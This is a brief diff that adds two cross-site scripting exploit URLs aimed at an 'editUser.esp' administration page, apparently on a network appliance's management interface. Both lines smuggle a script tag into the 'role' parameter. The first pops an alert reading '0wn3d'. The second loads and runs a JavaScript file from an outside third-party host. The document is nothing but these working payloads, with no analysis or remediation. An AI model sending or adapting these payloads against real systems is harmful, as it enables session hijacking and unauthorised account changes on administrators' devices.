@@ -1,0 +1,3 @@
+https://www.example.com:443/esp/editUser.esp?mode=edit&amp;origusername=test&amp;deviceC=localhost.localdomain&amp;vsysC=localhost.localdomain%2Fvsys1&amp;vsys=&amp;profile=&amp;cfgchange=&amp;opasswd=&amp;tpasswd=********&amp;cpasswd=********&amp;role=vsysadmin&lt;SCRIPT&gt;alert(&quot;0wn3d&quot;)&lt;/SCRIPT&gt; &amp;admin-role=%5Bobject+Object%5D&amp;bSubmit=O
+
+https://www.example.com:443/esp/editUser.esp?mode=edit&amp;origusername=test&amp;deviceC=localhost.localdomain&amp;vsysC=localhost.localdomain%2Fvsys1&amp;vsys=&amp;profile=&amp;cfgchange=&amp;opasswd=&amp;tpasswd=********&amp;cpasswd=********&amp;role=vsysadmin&lt;SCRIPT/XSS src=&quot;/http://www.jeromiejackson.com/tryme.js&quot;&gt;&lt;/SCRIPT&gt;&amp;admin-role=%5Bobject+Object%5D&amp;bSubmit=O
